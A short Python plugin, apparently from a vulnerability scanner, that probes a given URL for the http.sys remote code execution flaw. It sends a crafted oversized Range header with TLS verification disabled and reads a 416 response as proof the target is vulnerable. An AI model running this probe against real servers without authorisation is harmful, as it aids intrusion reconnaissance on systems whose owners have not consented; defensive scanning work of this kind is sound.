#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://blog.csdn.net/weixin_74985952/article/details/131157845',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'http.sys远程代码执行',

      'level'     :   'critical',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/2/22',
  }
  return ret

def main(url):
  import socket
  from urllib.parse import urlparse
  try:
    parsed_result = urlparse(url)
    domain = parsed_result.hostname
    ip = socket.gethostbyname(domain)
    return ip
  except:
    pass
  return None
def run(url,ua):
  ret = msg()
  ip = main(url)
  if ip == None:
    return ret
  headers = {
      'User-Agent': ua,
      'Host':ip,
      'Range':'bytes=0-18446744073709551615',
      }
  ret['url'] = url
  try:
    res=requests.get(url=url,headers=headers,timeout=10,verify=False)
    if res.status_code == 416 and re.search(r'HTTP Error 416. The requested range is not satisfiable.',res.text,re.S|re.I):
      ret['huixian'] = '\n'+res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret